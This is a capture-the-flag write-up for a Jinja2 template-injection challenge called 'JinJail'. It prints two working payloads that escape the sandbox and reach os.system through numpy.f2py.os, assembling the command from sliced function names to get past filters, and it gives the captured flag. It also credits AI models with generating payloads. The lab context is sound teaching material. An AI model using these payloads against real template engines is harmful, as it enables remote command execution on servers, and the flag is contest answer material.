# JinJail - Misc

## 📝 Methodology
* **Vulnerability:** Server-Side Template Injection (SSTI) in Jinja2 with insufficient sandboxing.
* **Steps:**
    1.  Manual testing of injection attacks.
    2.  Identified SSTI, confirmed with `{{ 7*7 }}`.
    3.  AI assisted payload enumeration.

## 💻 Reproducibility (Code/Commands)
```bash
nc challenges.1pc.tf 33079

>>> {%set n=namespace(x=numpy.heaviside~numpy.heaviside,y=numpy.fix~numpy.fix,z=numpy.from_dlpack~numpy.from_dlpack)%}{{numpy.f2py.os.system(numpy.f2py.os.sep~n.y[10:14]~n.x[10:12]~n.z[16:18])}}

Nope, you didnt ask for help... 
```

```bash
{% set n=namespace(x=numpy.fix~numpy.fix,y=numpy.heaviside~numpy.heaviside,z=numpy.from_dlpack~numpy.from_dlpack) %}{{numpy.f2py.os.system(numpy.f2py.os.sep~n.x[10:14]~n.y[8:10]~n.z[25:27])}}

C2C{damnnn_i_love_numpy_b5c0de146222}0
```

![alt text](image.png)

## 🤖 AI Usage

* Claude Opus 4.6, Gemini 3 Pro used for initial recon, manual testing used to confirm findings, AI used to generate payload generator.
<!-- * Prompts: "Please analyse this python app inside docker container, locate vulnerabilities." -->

## 🚩 Proof

Flag: C2C{damnnn_i_love_numpy_b5c0de146222}